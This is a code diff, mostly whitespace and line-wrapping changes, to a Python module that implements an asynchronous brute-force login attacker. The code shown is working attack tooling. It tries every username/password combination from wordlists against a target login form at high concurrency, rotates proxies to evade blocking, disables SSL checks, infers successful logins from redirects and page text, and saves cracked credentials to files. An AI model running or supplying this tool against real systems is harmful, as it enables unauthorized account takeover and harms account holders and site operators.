@@ -78,7 +78,7 @@ class BruteStats:
 
 class AsyncBruteForcer:
     """🚀 High-performance async brute forcer"""
-    
+
     def __init__(self, config: Optional[BruteForceConfig] = None):
         self.config = config or BruteForceConfig()
         self.session: Optional[aiohttp.ClientSession] = None
@@ -91,19 +91,19 @@ class AsyncBruteForcer:
         self.all_results: List[BruteResult] = []
         self.proxies: List[str] = []
         self.proxy_index = 0
-        
+
         # Ensure output directory
         self.config.output_dir.mkdir(exist_ok=True)
-        
+
     async def __aenter__(self):
         """Async context manager entry"""
         await self.start_session()
         return self
-        
+
     async def __aexit__(self, exc_type, exc_val, exc_tb):
         """Async context manager exit"""
         await self.close_session()
-        
+
     async def start_session(self):
         """Initialize aiohttp session"""
         connector = aiohttp.TCPConnector(
@@ -112,9 +112,9 @@ class AsyncBruteForcer:
             ttl_dns_cache=300,
             use_dns_cache=True
         )
-        
+
         timeout = aiohttp.ClientTimeout(total=self.config.timeout)
-        
+
         headers = {
             'User-Agent': self.config.user_agent,
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
@@ -122,24 +122,24 @@ class AsyncBruteForcer:
             'Accept-Encoding': 'gzip, deflate',
             'Connection': 'keep-alive',
         }
-        
+
         self.session = aiohttp.ClientSession(
             connector=connector,
             timeout=timeout,
             headers=headers
         )
-        
+
     async def close_session(self):
         """Close aiohttp session"""
         if self.session:
             await self.session.close()
-            
+
     def load_proxies(self, proxy_file: Path) -> int:
         """Load proxy list from file"""
         try:
             with open(proxy_file, 'r') as f:
                 self.proxies = [
-                    line.strip() for line in f 
+                    line.strip() for line in f
                     if line.strip() and not line.startswith('#')
                 ]
             logging.info(f"Loaded {len(self.proxies)} proxies")
@@ -147,16 +147,16 @@ class AsyncBruteForcer:
         except Exception as e:
             logging.error(f"Failed to load proxies: {e}")
             return 0
-            
+
     def get_next_proxy(self) -> Optional[str]:
         """Get next proxy in rotation"""
         if not self.proxies:
             return None
-            
+
         proxy = self.proxies[self.proxy_index]
         self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
         return proxy
-        
+
     async def attempt_login(
         self,
         target_url: str,
@@ -166,7 +166,7 @@ class AsyncBruteForcer:
         method: str = "POST"
     ) -> BruteResult:
         """Single login attempt with rate limiting"""
-        
+
         start_time = time.time()
         result = BruteResult(
             username=username,
@@ -177,13 +177,13 @@ class AsyncBruteForcer:
             response_time=0.0,
             timestamp=datetime.now()
         )
-        
+
         async with self.semaphore:  # Limit concurrent requests
             async with self.rate_limiter:  # Rate limiting
                 try:
                     # Rate limiting delay
                     await asyncio.sleep(1.0 / self.config.rate_limit_per_second)
-                    
+
                     # Prepare request data
                     if login_data is None:
                         login_data = {
@@ -193,15 +193,16 @@ class AsyncBruteForcer:
                     else:
                         # Replace placeholders
                         login_data = {
-                            k: v.replace('{username}', username).replace('{password}', password)
+                            k: v.replace('{username}', username).replace(
+                                '{password}', password)
                             for k, v in login_data.items()
                         }
-                    
+
                     # Get proxy
                     proxy = None
                     if self.config.proxy_rotation:
                         proxy = self.get_next_proxy()
-                        
+
                     # Make request
                     request_kwargs = {
                         'url': target_url,
@@ -209,7 +210,7 @@ class AsyncBruteForcer:
                         'ssl': False,
                         'allow_redirects': False
                     }
-                    
+
                     if method.upper() == "POST":
                         request_kwargs['data'] = login_data
                         async with self.session.post(**request_kwargs) as response:
@@ -218,43 +219,43 @@ class AsyncBruteForcer:
                         request_kwargs['params'] = login_data
                         async with self.session.get(**request_kwargs) as response:
                             await self._process_response(response, result)
-                            
+
                     result.response_time = time.time() - start_time
-                    
+
                     # Check if successful
                     if result.status_code in self.config.success_codes:
                         # Additional success checks
                         result.success = await self._check_success_indicators(
                             response, username, password
                         )
-                        
+
                 except asyncio.TimeoutError:
                     result.error_message = "Request timeout"
                     result.response_time = time.time() - start_time
-                    
+
                 except Exception as e:
                     result.error_message = str(e)
                     result.response_time = time.time() - start_time
                     logging.debug(f"Login attempt failed: {e}")
-                    
+
         return result
-        
+
     async def _process_response(
-        self, 
-        response: aiohttp.ClientResponse, 
+        self,
+        response: aiohttp.ClientResponse,
         result: BruteResult
     ) -> None:
         """Process HTTP response"""
         result.status_code = response.status
         result.response_headers = dict(response.headers)
-        
+
         # Read response content (limited)
         try:
             content = await response.read()
             result.response_size = len(content)
         except Exception as e:
             logging.debug(f"Failed to read response: {e}")
-            
+
     async def _check_success_indicators(
         self,
         response: aiohttp.ClientResponse,
@@ -262,42 +263,44 @@ class AsyncBruteForcer:
         password: str
     ) -> bool:
         """Check for additional success indicators"""
-        
+
         # Check for redirect to dashboard/home
         if response.status in [301, 302]:
             location = response.headers.get('Location', '')
             success_indicators = [
-                'dashboard', 'home', 'profile', 'account', 
+                'dashboard', 'home', 'profile', 'account',
                 'welcome', 'main', 'index'
             ]
             if any(indicator in location.lower() for indicator in success_indicators):
                 return True
-                
+
         # Check response content for success indicators
         try:
             content = await response.text()
             content_lower = content.lower()
-            
+
             # Success indicators
             success_patterns = [
                 'welcome', 'dashboard', 'logout', 'profile',
                 'successfully logged in', 'login successful'
             ]
-            
+
             # Failure indicators
             failure_patterns = [
                 'invalid', 'incorrect', 'wrong', 'failed',
                 'error', 'denied', 'unauthorized'
             ]
-            
-            has_success = any(pattern in content_lower for pattern in success_patterns)
-            has_failure = any(pattern in content_lower for pattern in failure_patterns)
-            
+
+            has_success = any(
+                pattern in content_lower for pattern in success_patterns)
+            has_failure = any(
+                pattern in content_lower for pattern in failure_patterns)
+
             return has_success and not has_failure
-            
+
         except Exception:
             return False
-            
+
     async def brute_force_async(
         self,
         target_url: str,
@@ -307,29 +310,30 @@ class AsyncBruteForcer:
         method: str = "POST"
     ) -> List[BruteResult]:
         """Async brute force attack"""
-        
+
         self.stats = BruteStats(start_time=datetime.now())
         self.successful_creds.clear()
         self.all_results.clear()
-        
+
         logging.info(f"Starting brute force on {target_url}")
-        logging.info(f"Usernames: {len(usernames)}, Passwords: {len(passwords)}")
+        logging.info(
+            f"Usernames: {len(usernames)}, Passwords: {len(passwords)}")
         logging.info(f"Total combinations: {len(usernames) * len(passwords)}")
-        
+
         # Create all combinations
         combinations = [
-            (username, password) 
-            for username in usernames 
+            (username, password)
+            for username in usernames
             for password in passwords
         ]
-        
+
         total_combinations = len(combinations)
         self.stats.total_attempts = total_combinations
-        
+
         # Progress tracking
         progress = None
         task_id = None
-        
+
         if RICH_AVAILABLE and console:
             progress = Progress(
                 SpinnerColumn(),
@@ -346,7 +350,7 @@ class AsyncBruteForcer:
                 f"🔥 Brute forcing {urlparse(target_url).netloc}",
                 total=total_combinations
             )
-        
+
         try:
             # Create async tasks
             tasks = []
@@ -357,24 +361,24 @@ class AsyncBruteForcer:
                     )
                 )
                 tasks.append(task)
-                
+
             # Process results as they complete
             completed_count = 0
             for coro in asyncio.as_completed(tasks):
                 result = await coro
                 completed_count += 1
-                
+
                 # Update stats
                 self.all_results.append(result)
-                
+
                 if result.success:
                     self.successful_creds.append(result)
                     self.stats.successful_attempts += 1
-                    
+
                     logging.info(
                         f"SUCCESS! {result.username}:{result.password} on {target_url}"
                     )
-                    
+
                     # Stop on first success if fail_fast enabled
                     if self.config.fail_fast:
                         # Cancel remaining tasks
@@ -382,49 +386,51 @@ class AsyncBruteForcer:
                             if not remaining_task.done():
                                 remaining_task.cancel()
                         break
-                        
+
                 elif result.error_message:
                     self.stats.errors += 1
                 else:
                     self.stats.failed_attempts += 1
-                    
+
                 # Update progress
                 if progress and task_id:
                     progress.update(task_id, completed=completed_count)
-                    
+
                 # Auto-save progress periodically
-                if (self.config.save_attempts and 
-                    completed_count % 100 == 0):
+                if (self.config.save_attempts and
+                        completed_count % 100 == 0):
                     await self._save_progress()
-                    
+
         finally:
             if progress:
                 progress.stop()
-                
+
         # Final stats
         self.stats.end_time = datetime.now()
-        duration = (self.stats.end_time - self.stats.start_time).total_seconds()
+        duration = (self.stats.end_time -
+                    self.stats.start_time).total_seconds()
         self.stats.requests_per_second = completed_count / max(duration, 1)
-        
+
         if self.all_results:
-            avg_time = sum(r.response_time for r in self.all_results) / len(self.all_results)
+            avg_time = sum(
+                r.response_time for r in self.all_results) / len(self.all_results)
             self.stats.average_response_time = avg_time
-            
+
         self.stats.success_rate = (
             self.stats.successful_attempts / max(completed_count, 1)
         ) * 100
-        
+
         # Save final results
         if self.config.save_attempts:
             await self._save_final_results(target_url)
-            
+
         return self.successful_creds
-        
+
     async def _save_progress(self) -> None:
         """Save progress to file"""
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         progress_file = self.config.output_dir / f"progress_{timestamp}.json"
-        
+
         progress_data = {
             "stats": {
                 "total_attempts": self.stats.total_attempts,
@@ -443,29 +449,31 @@ class AsyncBruteForcer:
                 for result in self.successful_creds
             ]
         }
-        
+
         try:
             with open(progress_file, 'w') as f:
                 json.dump(progress_data, f, indent=2)
         except Exception as e:
             logging.error(f"Failed to save progress: {e}")
-            
+
     async def _save_final_results(self, target_url: str) -> None:
         """Save final results to files"""
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         base_name = urlparse(target_url).netloc.replace(':', '_')
-        
+
         # Save successful credentials
-        success_file = self.config.output_dir / f"success_{base_name}_{timestamp}.txt"
+        success_file = self.config.output_dir / \
+            f"success_{base_name}_{timestamp}.txt"
         with open(success_file, 'w') as f:
             f.write(f"# Successful credentials for {target_url}\n")
             f.write(f"# Found on {datetime.now().isoformat()}\n\n")
-            
+
             for result in self.successful_creds:
                 f.write(f"{result.username}:{result.password}\n")
-                
+
         # Save detailed results as JSON
-        results_file = self.config.output_dir / f"results_{base_name}_{timestamp}.json"
+        results_file = self.config.output_dir / \
+            f"results_{base_name}_{timestamp}.json"
         results_data = {
             "target": target_url,
             "timestamp": datetime.now().isoformat(),
@@ -489,18 +497,19 @@ class AsyncBruteForcer:
                 for result in self.successful_creds
             ]
         }
-        
+
         with open(results_file, 'w') as f:
             json.dump(results_data, f, indent=2)
-            
+
         logging.info(f"Results saved to {results_file}")
-        
+
     def get_stats_summary(self) -> Dict[str, Union[str, int, float]]:
         """Get human-readable stats summary"""
         duration = 0
         if self.stats.end_time:
-            duration = (self.stats.end_time - self.stats.start_time).total_seconds()
-            
+            duration = (self.stats.end_time -
+                        self.stats.start_time).total_seconds()
+
         return {
             "duration_seconds": round(duration, 2),
             "total_attempts": self.stats.total_attempts,
@@ -511,7 +520,7 @@ class AsyncBruteForcer:
             "average_response_time": round(self.stats.average_response_time, 3),
             "requests_per_second": round(self.stats.requests_per_second, 2)
         }
-        
+
     async def test_target(self, target_url: str) -> Dict[str, Union[str, bool, int]]:
         """Test if target is reachable"""
         try:
@@ -537,7 +546,7 @@ async def load_wordlist(file_path: Path) -> List[str]:
         async with aiofiles.open(file_path, 'r') as f:
             content = await f.read()
             return [
-                line.strip() for line in content.splitlines() 
+                line.strip() for line in content.splitlines()
                 if line.strip() and not line.startswith('#')
             ]
     except Exception as e:
@@ -553,21 +562,21 @@ async def quick_brute_force(
     rate_limit: float = 10.0
 ) -> List[BruteResult]:
     """Quick brute force with default settings"""
-    
+
     # Load wordlists
     usernames = await load_wordlist(username_file)
     passwords = await load_wordlist(password_file)
-    
+
     if not usernames or not passwords:
         logging.error("Failed to load wordlists")
         return []
-        
+
     # Configure brute forcer
     config = BruteForceConfig(
         max_concurrent=max_concurrent,
         rate_limit_per_second=rate_limit
     )
-    
+
     # Run brute force
     async with AsyncBruteForcer(config) as bruter:
         return await bruter.brute_force_async(target_url, usernames, passwords)
@@ -576,7 +585,7 @@ async def quick_brute_force(
 # Export main components
 __all__ = [
     'AsyncBruteForcer',
-    'BruteForceConfig', 
+    'BruteForceConfig',
     'BruteResult',
     'BruteStats',
     'load_wordlist',
